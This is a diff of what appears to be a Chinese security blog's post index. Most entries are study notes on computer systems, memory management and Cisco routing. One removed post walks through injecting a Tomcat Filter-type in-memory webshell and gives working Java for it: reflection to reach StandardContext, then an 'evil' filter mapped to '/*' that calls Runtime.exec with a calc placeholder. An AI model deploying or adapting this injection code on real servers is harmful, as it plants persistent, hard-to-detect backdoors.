+  <entry>
     <title>操作系统内存管理</title>
     <url>/archives/3c5272d9.html</url>
     <content><![CDATA[<h1 id="连续内存管理"><a href="#连续内存管理" class="headerlink" title="连续内存管理"></a>连续内存管理</h1><h2 id="最优算法"><a href="#最优算法" class="headerlink" title="最优算法"></a>最优算法</h2><p>寻找与所需内存最相近的快</p>
@@ -2059,35 +2088,6 @@ sun.misc.ProxyGenerator#generateProxyClass(java.lang.String, java.lang.Class<?>[
         <tag>页表</tag>
         <tag>虚拟内存</tag>
         <tag>内存交换</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>手写一个Tomcat Filter类型内存马</title>
-    <url>/archives/f0f0aa4f.html</url>
-    <content><![CDATA[<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">//            获取StandardContext对象</span></span><br><span class="line">            System.out.println(<span class="string">&quot;获取StandardContext对象&quot;</span>);</span><br><span class="line"><span class="comment">//            Field request = req.getClass().getDeclaredField(&quot;request&quot;);</span></span><br><span class="line"><span class="comment">//            request.setAccessible(true);</span></span><br><span class="line"><span class="comment">//            Request request1 = (Request) request.get(request);</span></span><br><span class="line"><span class="comment">//            StandardContext context1 = (StandardContext) request1.getContext();</span></span><br><span class="line">            <span class="type">ServletContext</span> <span class="variable">servletContext1</span> <span class="operator">=</span> req.getSession().getServletContext();</span><br><span class="line">            <span class="type">Field</span> <span class="variable">context</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            context = ApplicationContextFacade.class.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            context.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">context2</span> <span class="operator">=</span> ApplicationContext.class.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            context2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) context.get(servletContext1);</span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">context1</span> <span class="operator">=</span> (StandardContext) context2.get(applicationContext);</span><br><span class="line"></span><br><span class="line"><span class="comment">//            将EvilFilter添加到FilterDef</span></span><br><span class="line">            System.out.println(<span class="string">&quot;将EvilFilter添加到FilterDef&quot;</span>);</span><br><span class="line">            <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">             <span class="type">Filter</span> <span class="variable">evilFilter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>()&#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">                    Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">                    chain.doFilter(request, response);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                 <span class="meta">@Override</span></span><br><span class="line">                 <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"><span class="comment">//                     init方法必须写，不然会报错</span></span><br><span class="line">                 &#125;</span><br><span class="line"></span><br><span class="line">                 <span class="meta">@Override</span></span><br><span class="line">                 <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">//                    destory方法必须写，不然会报错</span></span><br><span class="line"></span><br><span class="line">                 &#125;</span><br><span class="line">             &#125;;</span><br><span class="line">            filterDef.setFilter(evilFilter);</span><br><span class="line">            <span class="type">String</span> <span class="variable">filterName</span> <span class="operator">=</span> <span class="string">&quot;evil&quot;</span>;</span><br><span class="line">            filterDef.setFilterName(filterName);</span><br><span class="line">            filterDef.setFilterClass(evilFilter.getClass().getName());</span><br><span class="line">            <span class="comment">//将FilterDef添加到FilterDefs</span></span><br><span class="line">            System.out.println(<span class="string">&quot;将FilterDef添加到FilterDefs&quot;</span>);</span><br><span class="line">            context1.addFilterDef(filterDef);</span><br><span class="line"><span class="comment">//            获取filterConfig并添加到filterConfigs</span></span><br><span class="line">            System.out.println(<span class="string">&quot;获取filterConfig并添加到filterConfigs&quot;</span>);</span><br><span class="line">            Constructor&lt;ApplicationFilterConfig&gt; declaredConstructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">            declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//            System.out.println(1);</span></span><br><span class="line">            <span class="type">ApplicationFilterConfig</span> <span class="variable">applicationFilterConfig</span> <span class="operator">=</span> declaredConstructor.newInstance(context1, filterDef);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> StandardContext.class.getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">            filterConfigs.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//            System.out.println(2);</span></span><br><span class="line">            <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> (Map) filterConfigs.get(context1);</span><br><span class="line">            map.put(filterName, applicationFilterConfig);</span><br><span class="line"><span class="comment">//            将filterMap添加到StandardContext</span></span><br><span class="line">            System.out.println(<span class="string">&quot;将filterMap添加到StandardContext&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">            filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">            filterMap.setFilterName(filterName);</span><br><span class="line">            filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">            context1.addFilterMapBefore(filterMap);</span><br><span class="line">            System.out.println(<span class="string">&quot;内存马注入成功&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
-<p>要实现一个Filter类型的内存马，必要要完成以下的步骤</p>
-<ul>
-<li>获取StandardContext对象</li>
-<li>写一个恶意FIlter</li>
-<li>将恶意Filter加入到FilterDef中</li>
-<li>将FIlterDef加入到FilterDefs中</li>
-<li>将FilterDefs封装到FilterConfig中</li>
-<li>将FilterCOnfig封装到FilterConfigs中</li>
-<li>添加FIlter Parttern</li>
-</ul>
-<p>首先要获取Standard对象<br>利用IDEA的Evaluate工具我们可以知道req.getSession().getServletContext()的执行结果是一个ApplicationContextFacade对象，在其中有一个Context属性为APplicationContext类型的对象，这个APplicationContext类型的对象中有有一个属性context为StrandardContext类型的对象，也就是我们需要的。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/b4d18b39f0e89dee214586de0bf6155c.png" alt="在这里插入图片描述"><br>所以我们利用两次反射就可以获取到该StandardContext对象</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext1</span> <span class="operator">=</span> req.getSession().getServletContext();</span><br><span class="line"><span class="type">Field</span> <span class="variable">context</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">context = ApplicationContextFacade.class.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">context.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">context2</span> <span class="operator">=</span> ApplicationContext.class.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">context2.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) context.get(servletContext1);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">context1</span> <span class="operator">=</span> (StandardContext) context2.get(applicationContext);</span><br></pre></td></tr></table></figure>
-<p>还有另一种获取到StandardContext对象的方式，可以直接通过request对象获取</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">request</span> <span class="operator">=</span> req.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">request.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Request</span> <span class="variable">request1</span> <span class="operator">=</span> (Request) request.get(request);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">context1</span> <span class="operator">=</span> (StandardContext) request1.getContext();</span><br></pre></td></tr></table></figure>
-<p>嗯，就这么多想说的，后面的看代码就好了，主要就是按照上面的步骤来注入就行了，这里注意恶意的Filter类必须显式的重写init与destory方法，否则你会发现怎么都注入不成功，当然这都是我踩过的坑，浪费了我很多时间。。。</p>
-]]></content>
-      <categories>
-        <category>漏洞利用</category>
-      </categories>
-      <tags>
-        <tag>tomcat</tag>
-        <tag>内存马</tag>
-        <tag>filter</tag>
       </tags>
   </entry>
   <entry>
@@ -2182,6 +2182,29 @@ sun.misc.ProxyGenerator#generateProxyClass(java.lang.String, java.lang.Class<?>[
       </tags>
   </entry>
   <entry>
+    <title>深入理解计算机系统读书笔记（一）</title>
+    <url>/archives/84d33ff8.html</url>
+    <content><![CDATA[<ul>
+<li>一个程序从文件到执行要经过这些过程：<br>源程序经过预处理器将声明的头部文件导入到程序中生成一个文本文件一般以.i结尾，然后经过编译器编译成汇编程序，一般以.s结尾，然后经过汇编器翻译成机器指令生成可重定位目标程序，此程序是一个二进制文件，然后经过链接器链接程序中使用的链接库函数最终生成一个可执行目标文件，最终该可执行文件被加载到内存中由系统执行。</li>
+<li>适配器一般是插在主板卡槽中的一块卡，控制器一般是集成在IO设备上的核心控制芯片</li>
+<li></li>
+<li>虚拟内存结构：最上层空间为操作系统内核内存，向下依次为用户栈、共享库映射区域、运行时堆、程序代码和数据。</li>
+<li>多核超线程：多核-多个CPU内核，超线程，单个CPU内核中能同时执行多个控制流，在core i7中单核可以同时执行两个控制流，这也就解释了我的一个疑惑，当初在编译linux内核的是有执行make -j number 为什么number会是系统内核数量的2倍，原来根源在这儿，果然看书能更增加人的知识面。该功能是通过在单个内核中备份某些硬件来实现的，如备份程序计数器（PC）及寄存器文件。</li>
+<li>指令级并行，现代处理器可以同时执行多条指令的属性称为指令级并行</li>
+<li>时钟周期，完成一轮0、1切换花费的时间，上网查的，不一定准确。</li>
+<li>超标量处理器：一个周期可以执行超过一条指令的处理器</li>
+<li>操作系统内核是应用程序与硬件的媒介，它提供三个基本抽象，文件时对系统I&#x2F;O设备的抽象，虚拟内存是对主存和磁盘的抽象，进程是对处理器、主存、I&#x2F;O设备的抽象，虚拟机是对操作系统、处理器、主存和I&#x2F;O设备的抽象。</li>
+<li>amdahl定律描述了对系统某一部分进行功能升级对整体性能的影响。其主要思想是在对系统的某个部分进行加速时，其对系统整体性能的影响取决于给部分的重要性与加速程度。如果系统原来的运行时间为T1，假设某部分所需的执行时间占系统运行时间的a，这部分性能提升了k倍，那么不难得出新系统的整体运行时间T2&#x3D;(1-a)T1+(aT1)&#x2F;k，加速时间比S&#x3D;T1&#x2F;T2&#x3D;1&#x2F;((1-a)+a&#x2F;k)。考虑极端的情况当k无限趋近于无穷大的时候S&#x3D;1&#x2F;(1-a)，系统整体的性能提升程度取决于该部分的重要程度，该结论通过简单的思考其实也并不难以得出。<br>-对于一个4字节表示的32为无符号整数来说，其在内存中的存储可采取大端法与小端法两种方式，大端法即字节高位在前，小端法即字节低位在前，比如此处有内存地址0x100 0x101 0x102 0x103，那么采用大端法对于整数0x01234567的存储顺序为01 23 45 67 对于小端法存储顺序为67 45 23 01，当然采用哪一种存储方式往往是没有什么影响的，但是当微处理器固定下来后，数据的存储方式也就被固定了，当然也存在有支持双端法的处理器，由用户来选择使用哪一种存储顺序，当然具体采用那种存储顺序还取决于操作系统支持的存储方式，例如andriod就只支持小端的存储顺序。</li>
+</ul>
+]]></content>
+      <categories>
+        <category>读书笔记</category>
+      </categories>
+      <tags>
+        <tag>深入理解计算机系统</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>深入剖析Log4j2调用流程</title>
     <url>/archives/a60aa68e.html</url>
     <content><![CDATA[<p>@<a href="%E6%B7%B1%E5%85%A5%E5%89%96%E6%9E%90Log4j2%E8%B0%83%E7%94%A8%E6%B5%81%E7%A8%8B">TOC</a></p>
@@ -2206,6 +2229,29 @@ sun.misc.ProxyGenerator#generateProxyClass(java.lang.String, java.lang.Class<?>[
       </tags>
   </entry>
   <entry>
+    <title>深入理解计算机系统读书笔记（二）</title>
+    <url>/archives/b4c5d320.html</url>
+    <content><![CDATA[<ul>
+<li>数据的表示，无符号数一位就是一个数，有符号数采用补码的形式表示，最高位为负权，当最高位为1时其权重为-x(2**（w-1))，w为位数，x为最高位的取值。于是乎一个有符号数的补码表示就成了所有正权与负权之和。</li>
+<li>一个整数能被二进制方式表示，其根源在于其编码方式的唯一性，即双射，解释就是一个数在编码后有唯一的一个二进制格式与之对应，而这个二进制排列顺序在转换为整数后也有且仅有一个数与之对应。就想数学里的反函数一样。</li>
+<li>原码表示有符号数通过最高位作为符号位，如果最高位为1，则剩下的位取负权，如果最高位为0，则剩下的位取政权</li>
+<li>反码表示有符号数，最高位的权重为-x.(2**(2-1)-1) x为最高位的取值</li>
+<li>整数类型的强制类型转换，将一个无符号数转换为有符号数时二进制位的数据不变，变的只是解释这些位的方式。</li>
+<li>一个规律：一个4位有符号数-1，其强转为无符号数之后为15，注意到1+15 &#x3D; 16 &#x3D; 2*<em>4。这样就能很方便得进行负数有符号数转为无符号数，当然正数两种表示方式的结果都一样，当然一切都建立在有符号数使用补码表示。其原理为，最高位权重，对于一个4位表示的整数， 当使用补码时，最高位为1时权重为-8，使用无符号数时其权重为8，两者之间差了2</em>***4 &#x3D; 16。</li>
+<li>将无符号数转换为有符号数的时候，当无符号数小于等于有符号数的最大值的时候保持不变，当无符号数大于有符号数的最大值的时候，转换后的值为U-2**w，U为当前无符号数，w二进制位数。</li>
+<li>无符号数的长度扩展是零扩展，即大端法表示在左侧填充0，对于有符号数则是符号填充，负数填充1，正数填充0</li>
+<li>在将一个长度较小的有符号数变成无符号长度较大的数的时候，是先进行符号填充再进行符号转换的，如果顺序错了将产生完全不一样的结果。</li>
+<li>当一个有符号数与无符号数进行运算时会发生隐式类型转换，项范围更广的值转换。这个过程是非直观的，往往会导致很多预料之外的结果。</li>
+</ul>
+]]></content>
+      <categories>
+        <category>读书笔记</category>
+      </categories>
+      <tags>
+        <tag>深入理解计算机系统</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>深入理解计算机系统读书笔记（三）</title>
     <url>/archives/f9db7072.html</url>
     <content><![CDATA[<ul>
@@ -2226,52 +2272,6 @@ sun.misc.ProxyGenerator#generateProxyClass(java.lang.String, java.lang.Class<?>[
 <li>有符号数的除法。对于有符号数在进行除法操作时因为移位会导致符号位为1时被填充为0，那么结果的符号就变化了，而我们知道除法运算是不是改变符号的，这与事实不符，所以简单的逻辑移位是不对的，这时候需要用到算术移位，当然了，补码正数的运算方法还是和无符号数一样的。所谓算术唯一就是右移的时候高位不是填充0而是填充1，如-5[1011]除以2得到-3，通过移位为[11011]舍去低位得到-3[1101]，这个推导过程我没看懂这儿就不写了。</li>
 <li>浮点数的二进制表示3&#x2F;4&#x3D;1&#x2F;4+2&#x2F;4&#x3D;1&#x2F;4+1&#x2F;2&#x3D;2**(-1)+2**(-2) &#x3D; 0.11 ，不过这种方式不便于表示大数，数据较大的时候会导致存储数据消耗巨大的存储空间，所以有了IEEE标准的浮点数表示方法，对于单精度浮点数用32位表示1个符号位，8个阶码，23个位数位，数按进度浮点数用64位表示，一个符号位，11个阶码，52个尾数。符号位1表示负数0表示正数，阶码有三种格式中时不包含全是0与全是1的规格化值，一种是全是0的非规格话的值，另一种是全是1的无穷大的值。当使用规格化的值的时候，位级表示&#x3D;浮点数的指数尾数（阶码）+偏置值，这个偏置值对于单精度浮点数来说为127，对双精度来说为1023，所以对单精度来说最多可以表示的指数位为-126~127，双精度为-1022 ~ 1023。尾数这部分怎么计算的我还没看明白。对于特殊值的阶码来说，当小数位全为0的时候表示无求大，正无穷还是负无穷由符号位控制。对于非规格化阶码，其提供了0的表示方法，因为规格化的表示尾数必须大于1，则不可能表示0，同样的这种方式表示的0的符号由符号位控制也就是产生了正0与负0两种结果，这两种结果在有些情况下相等在有些情况下不相等。</li>
 <li></li>
-</ul>
-]]></content>
-      <categories>
-        <category>读书笔记</category>
-      </categories>
-      <tags>
-        <tag>深入理解计算机系统</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>深入理解计算机系统读书笔记（一）</title>
-    <url>/archives/84d33ff8.html</url>
-    <content><![CDATA[<ul>
-<li>一个程序从文件到执行要经过这些过程：<br>源程序经过预处理器将声明的头部文件导入到程序中生成一个文本文件一般以.i结尾，然后经过编译器编译成汇编程序，一般以.s结尾，然后经过汇编器翻译成机器指令生成可重定位目标程序，此程序是一个二进制文件，然后经过链接器链接程序中使用的链接库函数最终生成一个可执行目标文件，最终该可执行文件被加载到内存中由系统执行。</li>
-<li>适配器一般是插在主板卡槽中的一块卡，控制器一般是集成在IO设备上的核心控制芯片</li>
-<li></li>
-<li>虚拟内存结构：最上层空间为操作系统内核内存，向下依次为用户栈、共享库映射区域、运行时堆、程序代码和数据。</li>
-<li>多核超线程：多核-多个CPU内核，超线程，单个CPU内核中能同时执行多个控制流，在core i7中单核可以同时执行两个控制流，这也就解释了我的一个疑惑，当初在编译linux内核的是有执行make -j number 为什么number会是系统内核数量的2倍，原来根源在这儿，果然看书能更增加人的知识面。该功能是通过在单个内核中备份某些硬件来实现的，如备份程序计数器（PC）及寄存器文件。</li>
-<li>指令级并行，现代处理器可以同时执行多条指令的属性称为指令级并行</li>
-<li>时钟周期，完成一轮0、1切换花费的时间，上网查的，不一定准确。</li>
-<li>超标量处理器：一个周期可以执行超过一条指令的处理器</li>
-<li>操作系统内核是应用程序与硬件的媒介，它提供三个基本抽象，文件时对系统I&#x2F;O设备的抽象，虚拟内存是对主存和磁盘的抽象，进程是对处理器、主存、I&#x2F;O设备的抽象，虚拟机是对操作系统、处理器、主存和I&#x2F;O设备的抽象。</li>
-<li>amdahl定律描述了对系统某一部分进行功能升级对整体性能的影响。其主要思想是在对系统的某个部分进行加速时，其对系统整体性能的影响取决于给部分的重要性与加速程度。如果系统原来的运行时间为T1，假设某部分所需的执行时间占系统运行时间的a，这部分性能提升了k倍，那么不难得出新系统的整体运行时间T2&#x3D;(1-a)T1+(aT1)&#x2F;k，加速时间比S&#x3D;T1&#x2F;T2&#x3D;1&#x2F;((1-a)+a&#x2F;k)。考虑极端的情况当k无限趋近于无穷大的时候S&#x3D;1&#x2F;(1-a)，系统整体的性能提升程度取决于该部分的重要程度，该结论通过简单的思考其实也并不难以得出。<br>-对于一个4字节表示的32为无符号整数来说，其在内存中的存储可采取大端法与小端法两种方式，大端法即字节高位在前，小端法即字节低位在前，比如此处有内存地址0x100 0x101 0x102 0x103，那么采用大端法对于整数0x01234567的存储顺序为01 23 45 67 对于小端法存储顺序为67 45 23 01，当然采用哪一种存储方式往往是没有什么影响的，但是当微处理器固定下来后，数据的存储方式也就被固定了，当然也存在有支持双端法的处理器，由用户来选择使用哪一种存储顺序，当然具体采用那种存储顺序还取决于操作系统支持的存储方式，例如andriod就只支持小端的存储顺序。</li>
-</ul>
-]]></content>
-      <categories>
-        <category>读书笔记</category>
-      </categories>
-      <tags>
-        <tag>深入理解计算机系统</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>深入理解计算机系统读书笔记（二）</title>
-    <url>/archives/b4c5d320.html</url>
-    <content><![CDATA[<ul>
-<li>数据的表示，无符号数一位就是一个数，有符号数采用补码的形式表示，最高位为负权，当最高位为1时其权重为-x(2**（w-1))，w为位数，x为最高位的取值。于是乎一个有符号数的补码表示就成了所有正权与负权之和。</li>
-<li>一个整数能被二进制方式表示，其根源在于其编码方式的唯一性，即双射，解释就是一个数在编码后有唯一的一个二进制格式与之对应，而这个二进制排列顺序在转换为整数后也有且仅有一个数与之对应。就想数学里的反函数一样。</li>
-<li>原码表示有符号数通过最高位作为符号位，如果最高位为1，则剩下的位取负权，如果最高位为0，则剩下的位取政权</li>
-<li>反码表示有符号数，最高位的权重为-x.(2**(2-1)-1) x为最高位的取值</li>
-<li>整数类型的强制类型转换，将一个无符号数转换为有符号数时二进制位的数据不变，变的只是解释这些位的方式。</li>
-<li>一个规律：一个4位有符号数-1，其强转为无符号数之后为15，注意到1+15 &#x3D; 16 &#x3D; 2*<em>4。这样就能很方便得进行负数有符号数转为无符号数，当然正数两种表示方式的结果都一样，当然一切都建立在有符号数使用补码表示。其原理为，最高位权重，对于一个4位表示的整数， 当使用补码时，最高位为1时权重为-8，使用无符号数时其权重为8，两者之间差了2</em>***4 &#x3D; 16。</li>
-<li>将无符号数转换为有符号数的时候，当无符号数小于等于有符号数的最大值的时候保持不变，当无符号数大于有符号数的最大值的时候，转换后的值为U-2**w，U为当前无符号数，w二进制位数。</li>
-<li>无符号数的长度扩展是零扩展，即大端法表示在左侧填充0，对于有符号数则是符号填充，负数填充1，正数填充0</li>
-<li>在将一个长度较小的有符号数变成无符号长度较大的数的时候，是先进行符号填充再进行符号转换的，如果顺序错了将产生完全不一样的结果。</li>
-<li>当一个有符号数与无符号数进行运算时会发生隐式类型转换，项范围更广的值转换。这个过程是非直观的，往往会导致很多预料之外的结果。</li>
 </ul>
 ]]></content>
       <categories>
@@ -2958,45 +2958,6 @@ sun.misc.ProxyGenerator#generateProxyClass(java.lang.String, java.lang.Class<?>[
       </tags>
   </entry>
   <entry>
-    <title>HRSP-浮动路由-RIP-ACL-IPsec</title>
-    <url>/archives/db738475.html</url>
-    <content><![CDATA[<h1 id="配置HSRP"><a href="#配置HSRP" class="headerlink" title="配置HSRP"></a>配置HSRP</h1><p>R1(config)#int f0&#x2F;0 &#x2F;&#x2F;内网端口<br>R1(config-if)#standby 1 ip 虚拟ip地址<br>R1(config-if)#standby 1 priority 100<br>R1(config-if)# standby 1 preempt  &#x2F;&#x2F;配置占先权<br>R1(config-if)# standby 1 times 2 8 &#x2F;&#x2F;hello间隔与保持时间 同一hsrp组的时间应一致<br>R1(config-if)# standby 1 track f0&#x2F;1 100 &#x2F;&#x2F;配置端口跟踪<br>R1(config)# spanning-tree vlan 10 root primary<br>R1(config)# spanning-tree vlan 20 root secondary &#x2F;&#x2F;配置生成树实现负载均衡vlan 20走备份路由<br>R2(config)#int f0&#x2F;0 &#x2F;&#x2F;内网端口<br>R2(config-if)#standby 1 ip 虚拟ip地址<br>R2(config-if)#standby 1 priority 195 &#x2F;&#x2F;0-255<br>R2(config-if)# standby 1 preempt &#x2F;&#x2F;设置活跃路由器得占先权，由于从较低优先级别得路由器中取回转发全，回复活跃路由器的角色<br>R2(config-if)# standby 1 times 2 8 &#x2F;&#x2F;hello间隔与保持时间<br>R2(config-if)# standby 1 track f0&#x2F;1 100 &#x2F;&#x2F;配置端口跟踪<br>R2(config)# spanning-tree vlan 10 root primary<br>R2(config)# spanning-tree vlan 20 root secondary &#x2F;&#x2F;配置生成树实现负载均衡vlan 20走备份路由<br>优先级高的路由其作为主路由，优先级低的路由作为备份路由，当主路由发生故障的时候，备份路由由监听状态切换到活跃状态。当优先级相同时，比较端口ip,ip较大的作为活跃路由，如果优先级低的路由<br>已经成为了活跃路由，那么优先级高的路由将作为监听路由，直到活跃路由发生故障。值愈大优先级越高</p>
-<h2 id="hsrp协议组中由6种状态："><a href="#hsrp协议组中由6种状态：" class="headerlink" title="hsrp协议组中由6种状态："></a>hsrp协议组中由6种状态：</h2><p>初始状态：路由器刚启动时，或者配置发生改变时<br>学习状态：路由其等待来自活跃路由器的消息，此时路由器还没有收到来自活跃里尤其的hello消息，也没有学习到虚拟路由器的ip地址<br>监听状态：路由其学习了虚拟的ip地址，但他既不是活跃路由器也不是监听路由器，此时负责监听来自活跃路由器与备份路由器的hello包<br>发言状态：路由器周期性发送hello消息，并参与活跃路由器或者备份路由器的京选<br>备份状态：处于该状态的路由器时下一个活跃路由器的候选设备，其周期性得发送hello包<br>活跃状态：负责转发虚拟路由器得数据包，并周期性得发送hello消息。<br>hello间隔：3s<br>保持间隔10s<br>通产保持间隔要在hello间隔得3倍<br>使用udp协议</p>
-<h2 id="vrrp-虚拟路由冗余协议"><a href="#vrrp-虚拟路由冗余协议" class="headerlink" title="vrrp 虚拟路由冗余协议"></a>vrrp 虚拟路由冗余协议</h2><p>只有初始状态、活跃状态、备份状态三种状态<br>允许vrrp组得设备间建立认证机制</p>
-<h1 id="rip-距离矢量算法，根据跳数来选择路由"><a href="#rip-距离矢量算法，根据跳数来选择路由" class="headerlink" title="rip-距离矢量算法，根据跳数来选择路由"></a>rip-距离矢量算法，根据跳数来选择路由</h1><p>属于内部网关协议igp-有一系列协议族  还有一种时外部网关协议egp-只有一种协议<br>内部网关协议是往往是工作在一个组织实体里面的的路由器之间交换路由信息的协议，组织实体是指像学校、医院之类的实体<br>最大路由跳数为15跳，大于该值的路由被认为不可达</p>
-<p>当更新周期到达时，其向相邻的路由器发送学习到的路由。</p>
-<p>通过更行-update 与请求-requests两种分组来传输信息，更新周期为30s，如果不进行指定默认通过广播的形式更新信息。更新信息包括路由表与跳数两个部分。其并不是绝对根据跳数来选择路由的，同时也会参考网络的带宽。因为rip协议通过相邻路由器来更新路由表所以多网络全局的状况不清除，从而导致了一个慢收敛与不一致的问题。当三个火更多路由器构成环路是路由环路的问题仍会发生，这是需要用到触发更新法</p>
-<p>RIP的水平分割</p>
-<p>既路由器不向路径到来的方向回传此路径。通过将这些路由的跳数设置为16来实现该功能，能及时的解决路由环路的问题</p>
-<p>RIP的保持定时器法</p>
-<p>保持定时器可以防止路由器在路径从路由器从路由表中删除一定时间内（通常为180秒）接受新的路由信息。目的是为了保证每个路由器都收到路由不可达的信息，从而有效得避免了路由环路得产生。</p>
-<p>RIP的触发更新法</p>
-<p>当某个路径的跳数改变了路由器立即发生更新信息，不管路由器是否到达常规信息更新时间都发出更新信息。能够有效得加快路由的收敛时间</p>
-<p>收敛机制</p>
-<p><img src="/archives/db738475/QQ20210329085323.png"></p>
-<p>当主机与其直连路由器的链路发生中断时，其立刻向于其相邻的两个路由器发送路由更新信息，如果此时发送到右下路由器的信息发生堵塞延迟，则右上方的路由器先得到更新信息，将旧的到达主机的路由信息丢弃，右下方路由器因为没有收到来自左上路由器的更新信息，继续向右上路由器发送旧的路由信息，右上方路由器收到后又添加一条到达主机的路由。如此循环形成了路由环路。<br>使用udp协议的520端口</p>
-<p>RIP帧格式</p>
-<p><a href="RIP%E5%B8%A7%E6%A0%BC%E5%BC%8F%202019e93eb947495cbb98e4df2efa90c1.csv">RIP帧格式</a></p>
-<p>(config)#router rip<br>(config)#acc 1 deny any<br>(config-router)# network 接口网段<br>(config-router)# network 接口网段<br>(config-router)# passive-interface f0&#x2F;1 &#x2F;&#x2F;配置被动接口，只收不发<br>(config-router)# discribute-list 1 in f0&#x2F;1 &#x2F;&#x2F;配置路由过滤<br>(config-router)# distance 50 &#x2F;&#x2F;配置管理距离值，该值越小路由信息越可靠<br>(config-router)# neigbor 192l.168.1.24 &#x2F;&#x2F;配置邻居路由，以单播的形式发送路由信息</p>
-<h1 id="配置浮动路由"><a href="#配置浮动路由" class="headerlink" title="配置浮动路由"></a>配置浮动路由</h1><p>ip route 网段 掩码 下一跳地址|端口号 70<br>ip route 网段 掩码 下一跳地址|端口号 100 &#x2F;&#x2F;最后一个参数位管理距离，其值越大表示优先级越低</p>
-<h1 id="ACL"><a href="#ACL" class="headerlink" title="ACL"></a>ACL</h1><p>配置acl首先要配置内外网端口，配置过滤规则，将规则应用到端口。最后有一条默认拒绝所有。deny any</p>
-<p>ACL包括标准acl 与扩展acl</p>
-<p>标准acl是机与源ip地址进行过滤的 工作在三成 表号1-99</p>
-<p>扩展acl可以通过端口号、协议等进行匹配过滤 国祚在三层与四层 表号 100-199</p>
-<p>一个接口的一个方向只能有一张acl表，数据包一旦被某个rule匹配，就不再向下进行匹配。</p>
-]]></content>
-      <categories>
-        <category>安全技术</category>
-        <category>协议规范</category>
-      </categories>
-      <tags>
-        <tag>HRSP</tag>
-        <tag>RIP</tag>
-        <tag>ACL</tag>
-        <tag>IPSec</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>HTTP-HTTPS协议</title>
     <url>/archives/ac8f02b1.html</url>
     <content><![CDATA[<h1 id="HTTP-HTTPS协议"><a href="#HTTP-HTTPS协议" class="headerlink" title="HTTP&#x2F;HTTPS协议"></a>HTTP&#x2F;HTTPS协议</h1><h1 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h1><h2 id="HTTP概述"><a href="#HTTP概述" class="headerlink" title="HTTP概述"></a>HTTP概述</h2><p>http-超文本标记语言，属于七层应用层协议，默认端口号80，基于tcp的协议。</p>
